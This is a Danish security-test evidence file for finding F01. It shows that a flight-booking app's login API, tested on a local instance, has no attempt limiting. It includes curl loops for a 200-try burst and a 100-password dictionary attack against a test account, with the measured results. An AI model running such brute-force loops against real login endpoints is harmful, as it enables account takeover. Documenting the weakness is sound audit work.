# F01 – bevis: ingen begrænsning af login-forsøg

Kørt 2026-11-11 mod http://localhost:8000 (lokal instans, baseline 3da62b4).

## Test 1: 200 forkerte forsøg i træk mod alice@its.dk

    K='Flight%20booker%201.2%20plus%20edition'
    B="http://localhost:8000/api/API.php?API_KEY=$K&action=login"
    for i in $(seq 1 200); do
      curl -s -o /dev/null -w "%{http_code} %{time_total}\n" "$B&email=alice@its.dk&pass=forkert$i"
    done > burst-200-forsoeg.txt

Resultat (`burst-200-forsoeg.txt`): 200 × HTTP 200, gns. svartid 0,0032 s, max 0,041 s (første kald, kold cache).
Ingen forsinkelse, ingen lockout, ingen CAPTCHA. Forsøg 201 gav stadig det normale svar:
`[{"status":"450","statusDescription":"No user found"}]`.
Det svarer til ca. 300 forsøg pr. sekund fra én klient uden parallelisering.

## Test 2: ordbogsangreb med 100 almindelige passwords mod begge testkonti

    while read -r p; do curl -s "$B&email=alice@its.dk&pass=$p"; done < wordlist-100.txt

Resultat: alle 100 forsøg pr. konto blev behandlet; intet match (testkontiene bruger ikke et password fra listen).
Testen viser, at et ordbogsangreb kan køre uhindret; at det ikke gav adgang her, skyldes kun den valgte liste.
